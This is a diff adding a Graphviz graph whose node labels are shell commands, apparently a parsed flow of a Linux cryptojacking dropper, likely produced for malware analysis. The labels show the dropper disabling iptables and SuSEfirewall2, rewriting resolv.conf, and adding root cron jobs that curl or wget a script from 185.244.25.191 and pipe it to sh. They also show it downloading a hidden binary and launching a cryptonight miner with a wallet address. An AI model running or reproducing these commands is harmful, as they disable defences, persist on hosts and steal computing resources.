@@ -1,0 +1,56 @@
+digraph {
+0 [label="/etc/init.d/iptables stop "];
+0 -> 0
+2 [label="service iptables stop "];
+2 -> 4 [label=";,"];
+4 [label="SuSEfirewall2 stop "];
+4 -> 6 [label=";,"];
+6 [label="reSuSEfirewall2 stop "];
+6 -> 8 [label=";,"];
+8 [label="echo nameserver 8.8.8.8 /etc/resolv.conf "];
+8 -> 8
+14 [label="/etc/resolv.conf "];
+14 -> 14
+12 [label="echo /etc/resolv.conf nameserver 8.8.4.4 "];
+12 -> 12
+14 [label="/etc/resolv.conf "];
+14 -> 14
+16 [label="echo */5 * * * * curl -fsSL http://185.244.25.191/i.sh | sh /var/spool/cron/root "];
+16 -> 16
+22 [label="/var/spool/cron/root "];
+22 -> 22
+20 [label="echo */5 * * * * wget -q -O- http://185.244.25.191/i.sh | sh /var/spool/cron/root "];
+20 -> 20
+22 [label="/var/spool/cron/root "];
+22 -> 22
+24 [label="mkdir -p /var/spool/cron/crontabs "];
+24 -> 24
+26 [label="echo */5 * * * * curl -fsSL http://185.244.25.191/i.sh | sh /var/spool/cron/crontabs/root "];
+26 -> 26
+32 [label="/var/spool/cron/crontabs/root "];
+32 -> 32
+30 [label="echo */5 * * * * wget -q -O- http://185.244.25.191/i.sh | sh /var/spool/cron/crontabs/root "];
+30 -> 30
+32 [label="/var/spool/cron/crontabs/root "];
+32 -> 32
+34 [label="[ ! -f /usr/lib/local/.zh ] "];
+34 -> 36 [label="SC,N,if,"];
+36 [label="mkdir -p /usr/local/lib/.zh "];
+36 -> 38 [label=";,then,"];
+38 [label="wget http://185.244.25.191/x -O /usr/local/lib/.zh/   "];
+38 -> 40 [label="\n,"];
+40 [label="cd /usr/local/lib/.zh/ "];
+40 -> 42 [label=";,"];
+42 [label="chmod 777    "];
+42 -> 52 [label=";,"];
+52 [label="./   -a cryptonight -o stratum+tcp://176.9.53.68:5555 -u 47rT5wSPhzE5HmgYieKEn8ac8S4Qne7JmZT4D2u3mFKPBmKBXF7frEsSmMd41MNuFNMTbc3xTdUzhJ51qi9XWDs1GnwUhKU -p x -k -B /dev/null "];
+52 -> 53 [label=";,"];
+53 [label="/dev/null "];
+53 -> 53
+48 [label="curl -O- http://185.244.25.191/x -O /usr/lib/.zh/   "];
+48 -> 50 [label="&,else,"];
+50 [label="chmod 777 "];
+50 -> 52 [label=";,"];
+52 [label="./   -a cryptonight -o stratum+tcp://176.9.53.68:5555 -u 47rT5wSPhzE5HmgYieKEn8ac8S4Qne7JmZT4D2u3mFKPBmKBXF7frEsSmMd41MNuFNMTbc3xTdUzhJ51qi9XWDs1GnwUhKU -p x -k -B /dev/null "];
+52 -> 53 [label=";,"];
+}
